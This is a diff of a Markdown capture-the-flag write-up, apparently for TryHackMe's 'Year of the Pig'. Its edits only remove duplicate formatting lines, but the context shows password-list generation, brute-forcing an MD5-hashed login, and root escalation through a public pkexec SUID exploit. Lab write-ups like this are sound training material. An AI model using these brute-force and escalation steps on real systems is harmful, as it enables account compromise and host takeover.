@@ -55,14 +55,12 @@ I created the `wordlist` through <mark style="background: #FF5582A6;">cewl</mark
 └─$ cewl http://10.10.41.180/ > file.txt
 ```
 {: .nolineno}
-{: .nolineno}
 
 To make all the password values as lowercase I used this **trim** command 🔽
 ```bash
 ┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]
 └─$ cat file.txt | tr '[:upper:]' '[:lower:]' > wordlist.txt
 ```
-{: .nolineno}
 {: .nolineno}
 
 For making the wordlist that is followed by two numbers and a special character I used this custom made python script 🔽
@@ -94,7 +92,6 @@ with open("modified_wordlist.txt", "w") as file:
 print("Wordlist generated successfully!")
 ```
 {: .nolineno}
-{: .nolineno}
 {: file: password.py}
 
 Lets use it Now : 
@@ -104,7 +101,6 @@ Lets use it Now :
 Wordlist generated successfully!
 ```
 {: .nolineno}
-{: .nolineno}
 
 Now I have 134400 numbers of passwords . 
 
@@ -113,7 +109,6 @@ Now I have 134400 numbers of passwords .
 └─$ wc modified_wordlist.txt 
  134400  140000 1293600 modified_wordlist.txt
 ```
-{: .nolineno}
 {: .nolineno}
 
 When Login I noticed this MD5 implementation in password field 🔽
@@ -150,7 +145,6 @@ ID           Response   Lines    Word       Chars       Payload
 000025768:   500        0 L      0 W        0 Ch        "375af69ffa42147b2e1f62908436d4d3"                       
 000025769:   200        0 L      3 W        99 Ch       "e..............................c"                       
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now I got the password `md5` hash lets crack it with this [online hashes site](https://hashes.com/en/decrypt/hash) Tool🔻
@@ -191,7 +185,6 @@ uid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers)
 marco@year-of-the-pig:~$ 
 ```
 {: .nolineno}
-{: .nolineno}
 
 Now I checked <mark style="background: #D2B3FFA6;">SUIDs</mark> and got <mark style="background: #FF5582A6;">pkexec</mark> as SUIDs permitted so I uploaded an exploit related to pkexec from [here](https://github.com/Almorabea/pkexec-exploit/tree/main) and ran it .
 
@@ -223,7 +216,6 @@ marco@year-of-the-pig:~$ /usr/bin/pkexec --version
 pkexec version 0.105
 marco@year-of-the-pig:~$
 ```
-{: .nolineno}
 {: .nolineno}
 
 Lets upload our payload here ⏬
@@ -269,6 +261,5 @@ root@year-of-the-pig:/root# cat root.txt
 THM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}
 root@year-of-the-pig:/root# 
 ```
-{: .nolineno}
 {: .nolineno}
 I am root now !!
